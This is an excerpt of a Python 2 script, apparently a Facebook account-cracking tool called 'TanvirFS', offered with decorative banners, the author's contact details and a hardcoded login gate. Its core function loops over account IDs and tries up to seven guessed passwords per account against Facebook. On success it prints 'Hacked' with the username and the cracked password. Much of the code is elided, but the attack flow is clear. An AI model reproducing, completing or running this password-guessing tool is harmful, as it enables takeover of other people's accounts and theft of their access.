...
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-Tanvir1-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................Tanvir1......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Bangladesh
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mTanvir1\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
print  """
 ...
 \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To TanvirFS▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mTanvir1\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91mTanvir Ahmed
\033[1;94mTanvir1\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91mYour.Xan.Tanvir
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+8801750079773
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mTanvir1\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m....................Tanvir1.....................:')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin Tanvir1\033[1;95m♡╰──────────•◈•──────────╯♡"

CorrectUsername = "Friend Squad"
CorrectPassword = "Tanvir1"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/xyz.tanvir.999')
    else:
...
def login():
	...
	try:
		...
		os.system('clear')
		print logo
		jalan(' \033[1;92mWarning: \033[1;97mPlease use New Account ' )
		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mTanvir1\033[1;95m♡──────────•◈•──────────♡"
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;95mLogin Successfull...'
				os.system('xdg-open https://www.facebook.com/Your.Xan.Tanvir')
...
def pilih_super():
	...
	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRLT+Z♡\033[1;94m----»"
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mTanvir1\033[1;95m♡──────────•◈•──────────♡"
	jalan(' \033[1;93m ........Please Wait Few Minutes.......... ')
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mTanvir1\033[1;95m♡──────────•◈•──────────♡"
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;92m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass1
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass2
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass3
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass4
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass5
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass6
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mHacked\x1b[1;97m-\x1b[1;94m✧\x1b[1;97m-' + user + '-\x1b[1;94m✧\x1b[1;97m-' + pass7
	...
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mTanvir1\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By Tanvir---•◈•---»" #Dev:love_hacker
	...
	print """
             ...
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....Friend Squad  Tanvir1........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +8801750079773"""
